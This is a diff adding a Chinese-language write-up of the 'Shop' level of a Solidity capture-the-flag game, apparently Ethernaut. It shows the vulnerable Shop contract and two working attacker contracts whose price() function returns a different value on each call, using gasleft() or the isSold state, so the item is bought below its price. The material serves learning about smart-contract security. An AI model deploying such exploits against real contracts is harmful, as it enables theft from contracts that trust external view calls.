@@ -1578,3 +1578,57 @@ contract Denial {
 
 - 当使用 `call` 发起外部调用时，最好指定汽油量，如 `call.gas(100000).value()`
 - 外部 `CALL` 最多可以使用 `CALL` 时 63/64 的汽油，因此，足够高的汽油量也可以缓解这种攻击
+
+## 21. Shop
+
+以低于定价的价格从商店购买商品
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Buyer {
+  function price() external view returns (uint);
+}
+
+contract Shop {
+  uint public price = 100;
+  bool public isSold;
+
+  function buy() public {
+    Buyer _buyer = Buyer(msg.sender);
+
+    if (_buyer.price() >= price && !isSold) {
+      isSold = true;
+      price = _buyer.price();
+    }
+  }
+}
+```
+
+- 需要实现 `price()` 函数，使得第一次调用时返回的价格不小于定价，第二次调用时返回的价格小于定价
+- 声明了 `view` 的函数不能修改状态，第一反应是利用 `gasleft()` 来获得变化的值
+
+    ```js
+    contract Hack {
+      function buy(address instance) public {
+        Shop(instance).buy();
+      }
+      function price() external view returns (uint) {
+        return gasleft() / 10 - 300;  // 在 Goerli 测试网络上调试通过
+      }
+    }
+    ```
+
+- 声明了 `view` 的函数可以读取状态，因此也可以利用状态变量 `isSold`
+
+    ```js
+    contract Hack {
+      function buy(address instance) public {
+        Shop(instance).buy();
+      }
+      function price() external view returns (uint) {
+        return Shop(msg.sender).isSold() ? 0 : 100;
+      }
+    }
+    ```
